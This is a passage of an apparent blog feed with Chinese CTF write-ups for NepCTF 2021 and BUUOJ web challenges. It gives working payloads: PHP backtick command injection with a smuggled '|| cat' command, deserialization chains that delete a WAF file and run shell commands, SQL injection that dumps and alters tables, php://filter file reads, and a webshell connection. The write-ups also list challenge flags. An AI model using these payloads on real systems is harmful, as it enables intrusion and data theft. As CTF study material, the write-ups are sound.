href="https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5">https://blog.csdn.net/qq_45521281/article/details/107556915?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161812604616780261937076%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161812604616780261937076&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107556915.first_rank_v2_pc_rank_v29&amp;utm_term=smarty%E6%B3%A8%E5%85%A5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模板注入-SSTI-的简单总结&quot;&gt;&lt;a href=&quot;#模板注入-SSTI-的简单总结&quot; class=&quot;headerlink&quot; title=&quot;模板注入(SSTI)的简单总结&quot;&gt;&lt;/a&gt;模板注入(SSTI)的简单总结&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="Web" scheme="https://rossweisse.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
    <category term="Web" scheme="https://rossweisse.github.io/tags/Web/"/>
    
    <category term="python" scheme="https://rossweisse.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>nep2021部分WriteUp</title>
    <link href="https://rossweisse.github.io/2021/03/24/WriteUp/nep2021/"/>
    <id>https://rossweisse.github.io/2021/03/24/WriteUp/nep2021/</id>
    <published>2021-03-24T09:47:04.000Z</published>
    <updated>2021-08-07T11:29:34.098Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><a id="more"></a><p>对于本萌新来说，这次的nep比赛是非常好的一次历练机会（虽然web一道都没有写出来QAQ，但是之后复现后学到了很多新的姿势，相对来说还是有点提升的，嘿嘿。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p>打开题目后发现一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$nep</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>];</span><br><span class="line">    <span class="variable">$len</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;len&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$len</span>)&lt;<span class="number">8</span> &amp;&amp; strlen(<span class="variable">$nep</span>)&lt;<span class="number">13</span>)&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$nep</span>,<span class="number">0</span>,<span class="variable">$len</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>算是第一次遇到trick题吧，找了找度娘知道可以利用<strong>php的反引号执行系统命令</strong> 的特性</p><h4 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h4><p>tips：这个解法需要开两次靶机，第一次查看文件目录，第二次cat</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?nep=`ls&gt;<span class="number">1</span>`&amp;len=<span class="number">7</span></span><br></pre></td></tr></table></figure><p>可以得到</p><p><img src="https://i.loli.net/2021/03/23/hSQWDe2IVbiFzGH.png"></p><p>然后再开一次靶机</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url/?nep=`&gt;cat`;&amp;len=<span class="number">7</span></span><br><span class="line">url/?nep=`*&gt;<span class="number">1</span>`;&amp;len=<span class="number">7</span></span><br><span class="line">在这里*&gt;<span class="number">1</span>相当于cat index.php nepctf.php&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure><p>最后得到flag</p><blockquote><p>NepCTF{n3pn3p_l1ttle_tr1ck_c0me_bAck}</p></blockquote><h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || ls&gt;<span class="number">1</span></span><br><span class="line">url/?nep=`<span class="variable">$len</span>`;&amp;len=<span class="number">7</span> || cat nepctf.php&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>由于intval()函数的特性，会在遇到第一个非数字字符时停止截取，而nep参数中运用反引号``调用len参数</p><p>由于len=7 || cat nepctf.php&gt;1在linux中运行可知7不是一个命令，所以会执行||（或）之后的另一个命令</p><p>即</p><p><img src="https://i.loli.net/2021/03/23/itKIN7fSxoB8Ub6.png"></p><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><p>进入题目后看见一串特长的代码，先来简单审计一下</p><p>首先是Game类，里面有<code>wakeup</code>和<code>destruct</code>方法，<code>wakeup</code>里还有一个<code>21232f297a57a5a743894a0e4a801fc3</code>在线解码后是<code>admin</code></p><p>简单分析了一下，咱可以知道应该是要调用Open类里的<code>shell($content);</code>来进行任意命令的执行，但是由于<code>waf.txt</code>的存在，咱只能调用file_get_contents()</p><p>先看看shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>发现挺多命令也被ban了</p><p><img src="https://i.loli.net/2021/03/23/RFHKUXqhJju12sN.png"></p><p>但这先放一边，先看看怎么删除掉<code>waf.txt</code>文件，不然连命令都输不进去_(:з」∠)_</p><p>之前的代码审计咱可以知道，login类中的checking方法里有个<code>$this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);</code>这行代码</p><p>找找带有open()方法，而且还能删除文件的php原生类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>)&#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;open&#x27;</span></span><br><span class="line">        )))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span>.<span class="string">&quot;::&quot;</span>.<span class="variable">$method</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单测试一下，发现ZipArchive()刚好可以把<code>waf.txt</code>删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>然后就可以随意命令执行辣</p><p>tips：很多查看命令被ban了，但是还可以使用<code>php /flag</code>绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$register</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;register = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="keyword">new</span> Open();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Game();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>打开附件看到一串16进制字符串，放到cyberchef里转一转</p><p><img src="https://i.loli.net/2021/03/23/utHhbQYmrPwe8JE.png"></p><p>把剩下的复制到sublime text</p><p><img src="https://i.loli.net/2021/03/23/oHuLIRyTnXF7MSa.png" alt="image-20210323171836395"></p><p>看起来有点扁，放到画图软件里拉宽一下</p><p><img src="https://i.loli.net/2021/03/23/Hnav8yB4hPeTJQV.png" alt="image-20210323171933445"></p><p>可以清晰的看到flag</p><blockquote><p>Nep{Y0u_ar3_50_cl3ver!}</p></blockquote><h3 id="我是间谍2nd"><a href="#我是间谍2nd" class="headerlink" title="我是间谍2nd"></a>我是间谍2nd</h3><p>下载的附件直接打开显示出了一句话</p><p>**connecting to 223.223.223.223:6001 **</p><p>那咱就修改一下ip为223.223.223.223</p><p><img src="https://i.loli.net/2021/03/20/y8eCNGzUJhRFmVZ.png"></p><p>然后用netcat开监听，并运行文件</p><blockquote><p>nc -lvvp 6001</p></blockquote><p>发现有回响</p><p><img src="https://i.loli.net/2021/03/20/I7VFOUe6XrJZoc4.png"></p><p>连接可得到flag</p><blockquote><p>Nep{XVlBzgbaiCMRAjWwhTHctcuAxhxKQFDaFpLSjFbcXoEF}</p></blockquote><h3 id="出题人日记"><a href="#出题人日记" class="headerlink" title="出题人日记"></a>出题人日记</h3><p>打开附件后解压压缩包内容，发现是个.xlsx文件，拿010打开后查看文件头可以知道其实是一个.zip压缩文件</p><p>更改文件扩展名后解压缩</p><p>tips：这里打开压缩包的时候是有一个hint的，但是不能拿默认的解压缩软件打开，不然看不到备注</p><p><img src="https://i.loli.net/2021/03/24/xaPKZA3yI7kGT8v.png"></p><p>发现这个hint还被编码过了，拿去cyberchef解码一下</p><p><img src="https://i.loli.net/2021/03/24/pyd5CD7FhtfI68u.png"></p><p>然后去google直接搜索Steganography.js</p><p><a href="https://www.peter-eigenschink.at/projects/steganographyjs/showcase/">https://www.peter-eigenschink.at/projects/steganographyjs/showcase/</a></p><p>然后直接在王章内解密就可以得到flag了</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUOJ-Web-1pts</title>
    <link href="https://rossweisse.github.io/2021/03/11/WriteUp/BUUOJ%20web%201pts/"/>
    <id>https://rossweisse.github.io/2021/03/11/WriteUp/BUUOJ%20web%201pts/</id>
    <published>2021-03-11T14:05:23.000Z</published>
    <updated>2021-09-02T07:14:08.813Z</updated>
    
    <content type="html"><![CDATA[<p>BUUOJ-Web WriteUp</p><a id="more"></a><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p><p>这里是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure><p>可以登陆进去之后直接看到flag</p><p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p><blockquote><p>flag{2c793226-369d-4941-af62-10463af21b6c}</p></blockquote><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p><p>爆库名</p><blockquote><p>1’;show databases;#</p></blockquote><p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p><p>爆表名</p><blockquote><p>1’;show tables;#</p></blockquote><p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p><p>爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure><p>发现id在words表中，那么咱只需要改个表名就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure><p>然后只要登入就可以看到flag了</p><blockquote><p>1’ or 1=1 #</p></blockquote><p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p><p>直接进入ctrl + U看源代码，在下面发现藏东西了</p><p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p><p>按着GET一个cat变量，出现flag</p><p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p><blockquote><p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p></blockquote><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>ctrl+U发现一个Archive_room.php</p><p>用burpsuite抓一下包，发现一个secr3t.php</p><p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p><p>发现是一段简单的代码审计和文件包含</p><p>咱可以用伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p><p>得到一串base64编码，解码即可得到flag</p><blockquote><p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p></blockquote><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去后发现是简单的sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # 查看回显</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #爆数据</span><br></pre></td></tr></table></figure><p>最后得到flag</p><blockquote><p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p></blockquote><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>这题提示已经POST了一个一句话木马</p><p>直接用蚁剑连接</p><p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p><p>  得到flag</p><blockquote><p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p></blockquote><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p> ctrl+U发现一个secret.php</p><p>进入后依照提示逐一添加header</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure><p>即可得到flag</p><blockquote><p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p></blockquote><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>有提示可以知道有网站备份文件</p><p>运用脚本进行扫描</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure><p>得到一个<a href="http://www.zip/">www.zip</a></p><p>发现是一道php反序列化绕过，这里简化了一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码构造payload</p><figure class="highlight php"><table><tr><td 